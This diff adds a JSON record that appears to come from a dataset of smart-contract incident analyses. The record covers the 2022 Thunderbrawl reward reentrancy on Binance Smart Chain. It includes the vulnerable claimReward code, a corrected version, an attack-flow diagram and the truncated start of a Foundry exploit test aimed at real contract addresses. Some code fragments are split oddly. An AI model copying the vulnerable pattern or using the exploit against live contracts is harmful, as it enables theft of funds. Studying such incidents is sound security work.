@@ -1,0 +1,33 @@
+{
+ "id": "2022__2022-09_THB_GameRewardReentrancy",
+ "source_file": "2022/2022-09_THB_GameRewardReentrancy.md",
+ "title": "THB (Thunderbrawl) — Game Reward Reentrancy Attack Analysis",
+ "date": "2022-09-01",
+ "protocol": "Thunderbrawl",
+ "chain": "Binance Smart Chain",
+ "loss_raw": "Unconfirmed",
+ "loss_usd": null,
+ "root_cause": "Reentrancy via `onERC721Received()` callback during `claimReward()`, enabling duplicate reward claims",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Vulnerable HouseWallet - claimReward susceptible to reentrancy\ncontract HouseWallet {\n    mapping(uint256 => mapping(address => uint256)) public winners;\n\n    function shoot(\n        uint256 random,\n        uint256 gameId,\n        bool feestate,\n        /* ... */\n    ) external payable {\n        require(msg.value == 0.32 ether);\n        // Game logic: compute outcome based on random\n        // On win: winners[gameId][msg.sender] = winAmount\n    }\n\n    function claimReward(\n        uint256 _ID,\n        address payable _player,\n        uint256 _amount,\n        /* ... */\n    ) external {\n        require(winners[_ID][_player] >= _amount, \"Insufficient winning\");\n\n        //",
+  "❌ External call before state update (CEI pattern violation)\n        // NFT transfer triggers onERC721Received() callback\n        thbrNFT.safeTransferFrom(address(this), _player, tokenId);\n        // ↑ If _player is a contract, onERC721Received() is called\n        //   → claimReward() can be re-entered from within the callback\n        //   ↑ winners[_ID][_player] has not been decremented yet → re-claim succeeds\n\n        winners[_ID][_player] -= _amount; //",
+  "❌ State update after external call\n        payable(_player).transfer(_amount);\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern - CEI + ReentrancyGuard\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ncontract SafeHouseWallet is ReentrancyGuard {\n    function claimReward(\n        uint256 _ID,\n        address payable _player,\n        uint256 _amount\n    ) external nonReentrant {\n        require(winners[_ID][_player] >= _amount, \"Insufficient winning\");\n\n        //",
+  "✅ Update state first\n        winners[_ID][_player] -= _amount;\n\n        // External calls after\n        thbrNFT.safeTransferFrom(address(this), _player, tokenId);\n        payable(_player).transfer(_amount);\n    }\n}"
+ ],
+ "steps": [
+  "attacker is a contract → onERC721Received() callback!",
+  "winners not yet decremented → validation passes"
+ ],
+ "other_code": [
+  "Attacker Contract\n    │\n    ├─[1] Call shoot(random, gameId, ...) (0.32 ether)\n    │       └─ Join game and record prize\n    │           winners[gameId][attacker] = winAmount\n    │\n    ├─[2] Check winners(gameId, attacker)\n    │       └─ Confirm prize exists\n    │\n    ├─[3] Call claimReward(gameId, attacker, winAmount)\n    │       │\n    │       ├─ Prize validation passes\n    │       ├─ thbrNFT.safeTransferFrom(house, attacker, tokenId)\n    │       │   └─ attacker is a contract → onERC721Received() callback!\n    │       │       │\n    │       │       └─[Reenter] claimReward(gameId, attacker, winAmount)\n    │       │                   ├─ winners not yet decremented → validation passes\n    │       │                   ├─ Reentrant NFT transfer (continues while balance remains)\n    │       │    ",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IHouseWallet {\n    function winners(uint256 id, address player) external view returns (uint256);\n    function shoot(uint256 random, uint256 gameId, bool feestate) external payable;\n    function claimReward(uint256 _ID, address payable _player, uint256 _amount) external;\n}\n\ninterface ITHBR {\n    function balanceOf(address) external view returns (uint256);\n}\n\ncontract THBExploit is Test {\n    IHouseWallet house = IHouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);\n    ITHBR thbr = ITHBR(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C);\n\n    uint256 targetGameId;\n    uint256 reentrantCount;\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 21_785_004);\n        vm.deal(addr"
+ ]
+}
